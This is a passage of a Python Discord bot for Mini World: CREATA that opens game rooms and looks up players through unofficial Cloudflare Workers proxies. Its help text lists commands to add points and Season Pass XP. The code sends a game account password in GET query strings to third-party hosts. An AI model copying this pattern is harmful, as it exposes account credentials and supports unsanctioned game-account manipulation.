                "`!medal` — Equip badge/medal\n"
                "`!points` — Add points\n"
                "`!rename <name>` — Change name\n"
                "`!season` — Add Season Pass XP\n"
                "`!buka_room <name> <max> <pass> <mode>` — Buka room baru\n"
                "`!openroom <map_id> [name] [max] [pass]` — Open room with map\n"
                "`!player <uin>` — Lihat info player\n"
                "`!mwstatus` — Check Workers status\n\n"
                "**Owner Only (DM):**\n"
                "`!add <user_id>` — Grant kick/ban access\n"
                "`!delete <user_id>` — Revoke kick/ban access\n"
                "`!check` — View authorized users with names"
            ),
            inline=False
        )
        embed.set_footer(text="Mini World: CREATA Bot")
        await message.channel.send(embed=embed)
        return

    if content.startswith("!buka_room"):
        try:
            parts = message.content.split()
            room_name = parts[1] if len(parts) >= 2 else "Room"
            max_player = parts[2] if len(parts) >= 3 else "10"
            password = parts[3] if len(parts) >= 4 else ""
            game_mode = parts[4] if len(parts) >= 5 else "0"
            
            loading = await message.channel.send(f"⏳ **Membuka room:** `{room_name}` ...")
            async with aiohttp.ClientSession() as session:
                params = {
                    "name": room_name,
                    "max": max_player,
                    "mode": game_mode,
                    "uin": MW_UIN,
                    "pwd": MW_PWD
                }
                if password:
                    params["pass"] = password
                r = await session.get("https://miniworld-api.daxtercarl1202.workers.dev/buka_room", params=params, timeout=aiohttp.ClientTimeout(total=15))
                data = await r.json()
            if data.get("status") == "success":
                room = data.get("room", {})
                embed = discord.Embed(title="✅ Room Dibuka!", color=discord.Color.green())
                embed.add_field(name="Nama", value=room.get("name", room_name), inline=True)
                embed.add_field(name="Max Player", value=str(room.get("maxPlayer", max_player)), inline=True)
                embed.add_field(name="Tipe", value=room.get("type", "Public"), inline=True)
                embed.add_field(name="Mode", value=str(room.get("mode", game_mode)), inline=True)
                embed.add_field(name="Akun", value=f"`{MW_UIN}`", inline=True)
                await loading.edit(content="", embed=embed)
            else:
                embed = discord.Embed(title="❌ Buka Room Failed", description=f"`{data}`", color=discord.Color.red())
                await loading.edit(content="", embed=embed)
        except Exception as e:
            print(f"[BUKA_ROOM ERROR] {e}", flush=True)
            try:
                await loading.edit(content=f"❌ Error: {str(e)[:200]}", embed=None)
            except:
                await message.channel.send(f"❌ Error: {str(e)[:200]}")
        return

    if content.startswith("!openroom"):
        if not is_allowed(message.author.id):
            await message.channel.send("❌ You don't have access to this feature.")
            return
        try:
            parts = message.content.split(maxsplit=1)
            if len(parts) < 2:
                embed = discord.Embed(title="Usage", description="`!openroom <map_id> [room_name] [max_count] [password]`", color=discord.Color.blue())
                embed.add_field(name="Example", value="`!openroom 37f061acd1348dd71c27ba73aa7e9e01 MyRoom 10 pass123`", inline=False)
                await message.channel.send(embed=embed)
                return
            args = parts[1].split()
            map_id = args[0]
            room_name = args[1] if len(args) >= 2 else "DarkN2ss Room"
            max_count = args[2] if len(args) >= 3 else "10"
            passwd = args[3] if len(args) >= 4 else ""
            
            loading = await message.channel.send(f"⏳ **Opening room:** `{room_name}` ...\nMap: `{map_id}`")
            async with aiohttp.ClientSession() as session:
                params = {
                    "map_id": map_id,
                    "map_name": room_name,
                    "room_name": room_name,
                    "max_count": max_count,
                    "uin": "1320454366",
                    "uname": "%23B%23DarkN2ss.",
                }
                if passwd:
                    params["passwd"] = passwd
                r = await session.get("https://proxy-darkn2ss.darknessweb.workers.dev/api/openroom", params=params, timeout=aiohttp.ClientTimeout(total=15))
                data = await r.json()
            if data.get("code") == 0 or data.get("status") == "success":
                embed = discord.Embed(title="✅ Room Opened!", color=discord.Color.green())
                embed.add_field(name="Room Name", value=f"`{room_name}`", inline=True)
                embed.add_field(name="Map ID", value=f"`{map_id[:20]}...`", inline=True)
                embed.add_field(name="Max Players", value=f"`{max_count}`", inline=True)
                embed.add_field(name="Response", value=f"`{json.dumps(data)[:500]}`", inline=False)
                await loading.edit(content="", embed=embed)
            else:
                embed = discord.Embed(title="❌ Open Room Failed", description=f"```json\n{json.dumps(data, indent=2)[:1000]}```", color=discord.Color.red())
                await loading.edit(content="", embed=embed)
        except Exception as e:
            print(f"[OPENROOM ERROR] {e}", flush=True)
            try:
                await loading.edit(content=f"❌ Error: {str(e)[:200]}", embed=None)
            except:
                await message.channel.send(f"❌ Error: {str(e)[:200]}")
        return
    if content.startswith("!player"):
        try:
            parts = message.content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: `!player <uin>`")
                return
            uin = parts[1]
            loading = await message.channel.send(f"⏳ **Mencari player:** `{uin}` ...")
            async with aiohttp.ClientSession() as session:
                r = await session.get("https://miniworld-api.daxtercarl1202.workers.dev/player", params={"uin": uin}, timeout=aiohttp.ClientTimeout(total=15))
                data = await r.json()
            embed = discord.Embed(title="👤 Player Info", color=discord.Color.blue())
            embed.add_field(name="UIN", value=f"`{data.get('uin', uin)}`", inline=True)
            embed.add_field(name="Status", value=data.get("status", "N/A"), inline=True)
            await loading.edit(content="", embed=embed)
        except Exception as e:
            print(f"[PLAYER ERROR] {e}", flush=True)
            try:
                await loading.edit(content=f"❌ Error: {str(e)[:200]}", embed=None)
            except:
                await message.channel.send(f"❌ Error: {str(e)[:200]}")
        return

    if content.startswith("!servers"):
        if str(message.author.id) != str(OWNER_ID):
            return
        guilds = client.guilds
        embed = discord.Embed(title=f"🌐 Bot ada di {len(guilds)} server", color=discord.Color.green())
        for g in guilds:
            embed.add_field(name=g.name, value=f"ID: `{g.id}` | Members: {g.member_count}", inline=True)
        await message.channel.send(embed=embed)
        return

    if content.startswith("!owner"):
        embed = discord.Embed(title="👑 OWNER BOT", color=discord.Color.gold())
        embed.add_field(name="Owner", value="Daxterrr (`zecvxc_`)", inline=False)
        embed.add_field(name="Bot Co-Creator", value="Khairan (`khaigntg`)\nKall (`kallcigma`)", inline=False)
        await message.channel.send(embed=embed)
        return

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        pass

def start_health_server():
    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
    server.serve_forever()

print("[BOT] Starting health server on :8080...", flush=True)
threading.Thread(target=start_health_server, daemon=True).start()
print("[BOT] Starting Mini World Command Bot...", flush=True)
client.run(DISCORD_TOKEN)
